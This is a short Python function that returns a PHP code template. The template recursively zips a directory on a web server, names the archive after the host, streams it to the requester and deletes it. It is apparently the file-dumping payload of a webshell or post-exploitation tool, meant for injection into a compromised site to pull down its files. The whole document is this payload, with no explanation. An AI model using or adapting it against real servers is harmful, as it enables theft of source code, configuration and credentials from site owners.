
def get_php_dump():
    return """
        function addFileToZip($path, $zip) {
            $sp = DIRECTORY_SEPARATOR;
            $handler = opendir($path);
            while (($filename = readdir($handler)) !== false) {
            if ($filename != "." && $filename != "..") {
            if (is_dir($path.$sp.$filename)){
            addFileToZip($path.$sp.$filename, $zip);
            } else {
            $zip->addFile($path.$sp.$filename);
            }
            }
            }
            @closedir($path);
            }
            if (class_exists("ZipArchive")){
            $zip = new ZipArchive();
            $file_name = $_SERVER["HTTP_HOST"].".zip";
            if ($zip->open($file_name, ZipArchive::CREATE) === TRUE) {
            addFileToZip("%s", $zip);
            $zip->close();
            $fp=fopen($file_name,"r");
            $file_size=filesize($file_name);
            Header("Content-type: application/octet-stream");
            Header("Accept-Ranges: bytes");
            Header("Accept-Length:".$file_size);
            Header("Content-Disposition: attachment; filename=$file_name");
            $buffer=1024;
            $file_count=0;
            while(!feof($fp) && $file_count<$file_size){
            $file_con=fread($fp,$buffer);
            $file_count+=$buffer;
            echo $file_con;
            }
            fclose($fp);
            if($file_count >= $file_size) {
            unlink($file_name);
            }
            }
            }
        """
